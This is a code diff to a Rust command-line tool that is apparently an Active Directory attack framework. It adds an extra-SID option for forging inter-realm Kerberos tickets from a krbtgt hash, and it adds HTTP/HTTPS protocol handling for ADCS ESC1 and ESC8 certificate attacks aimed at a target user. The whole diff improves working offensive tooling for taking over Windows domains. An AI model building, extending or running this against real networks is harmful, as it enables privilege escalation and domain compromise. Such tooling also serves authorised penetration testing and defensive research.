@@ -1132,7 +1132,10 @@ async fn run_forge_action(cli: &Cli, domain: &str, action: &ForgeAction) -> i32 
         impersonate: opts.get("user").cloned(),
         user_rid: opts.get("rid").and_then(|r| r.parse().ok()).unwrap_or(0),
         group_rids: vec![],
-        extra_sids: vec![],
+        extra_sids: opts
+            .get("extra_sid")
+            .map(|s| vec![s.clone()])
+            .unwrap_or_default(),
         lifetime_hours: 0,
         output_path: opts.get("output").cloned(),
         payload_path: opts.get("payload_path").cloned(),
@@ -1240,10 +1243,14 @@ fn build_runner_action(
             target_domain,
             domain_sid,
             krbtgt_hash,
+            extra_sid,
             output,
         } => {
             opts.insert("domain_sid".to_string(), domain_sid.clone());
             opts.insert("krbtgt_hash".to_string(), krbtgt_hash.clone());
+            if let Some(sid) = extra_sid {
+                opts.insert("extra_sid".to_string(), sid.clone());
+            }
             opts.insert("output".to_string(), output.clone());
             RunnerForgeAction::InterRealmTgt {
                 target_domain: target_domain.clone(),
@@ -3816,13 +3823,29 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             template,
             target_user,
             output,
+            http,
         } => {
+            // Auto-detect HTTP from URL prefix if --http not explicitly set
+            let use_http = *http || ca.starts_with("http://");
+            // Strip protocol prefix for downstream use
+            let ca_host = ca
+                .strip_prefix("https://")
+                .or_else(|| ca.strip_prefix("http://"))
+                .unwrap_or(ca);
             println!("  {} Executing ESC1 attack...", ">".bright_black());
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
             println!("    Target User: {}", target_user.cyan());
+            println!(
+                "    Protocol: {}",
+                if use_http { "HTTP" } else { "HTTPS" }.cyan()
+            );
 
-            let exploiter = match overthrone_core::adcs::Esc1Exploiter::new(ca) {
+            let exploiter = match if use_http {
+                overthrone_core::adcs::Esc1Exploiter::with_ssl(ca_host, false)
+            } else {
+                overthrone_core::adcs::Esc1Exploiter::new(ca_host)
+            } {
                 Ok(e) => e,
                 Err(e) => {
                     banner::print_fail(&format!("ESC1 exploiter init failed: {}", e));
@@ -4191,11 +4214,29 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             println!("    URL: {}", url.cyan());
             println!("    Target User: {}", target_user.cyan());
 
+            // Parse URL to extract hostname and scheme
+            let url_trimmed = url.trim_end_matches('/');
+            let (use_https, hostname) = if let Some(rest) = url_trimmed.strip_prefix("https://") {
+                (true, rest.split('/').next().unwrap_or(rest).to_string())
+            } else if let Some(rest) = url_trimmed.strip_prefix("http://") {
+                (false, rest.split('/').next().unwrap_or(rest).to_string())
+            } else {
+                // No scheme prefix — assume HTTP (ESC8 standard)
+                (
+                    false,
+                    url_trimmed
+                        .split('/')
+                        .next()
+                        .unwrap_or(url_trimmed)
+                        .to_string(),
+                )
+            };
+
             let target = overthrone_core::adcs::Esc8RelayTarget {
-                ca_server: url.clone(),
+                ca_server: hostname,
                 template: "Machine".to_string(),
                 target_upn: Some(target_user.clone()),
-                use_https: false,
+                use_https,
             };
 
             let config = overthrone_core::adcs::Esc8AttackConfig::new(
